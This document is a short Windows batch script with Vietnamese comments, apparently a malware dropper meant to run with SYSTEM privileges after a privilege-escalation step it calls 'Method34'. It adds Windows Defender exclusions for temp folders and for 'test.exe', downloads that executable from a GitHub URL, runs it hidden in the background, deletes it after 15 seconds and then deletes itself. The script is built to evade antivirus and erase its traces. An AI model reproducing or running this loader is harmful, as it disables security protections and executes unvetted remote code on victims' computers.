@echo off
REM Batch này được thiết kế để chạy với quyền SYSTEM (qua Method34)
REM Không cần tự nâng quyền

set "TEMP=%USERPROFILE%\AppData\Local\Temp"

REM Thêm exclusion cho Windows Defender để tránh bị chặn
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionProcess 'test.exe' -ErrorAction SilentlyContinue"

REM Tải file (dùng PowerShell thay vì curl)
powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/Nphuc1503/fix/raw/refs/heads/main/test.exe' -OutFile '%TEMP%\test.exe' -UseBasicParsing"

REM Chạy file
if exist "%TEMP%\test.exe" (
    start /b "" "%TEMP%\test.exe"
    timeout /t 15 /nobreak >nul
    del /f /q "%TEMP%\test.exe" 2>nul
)

del /f /q "%~f0" 2>nul
exit
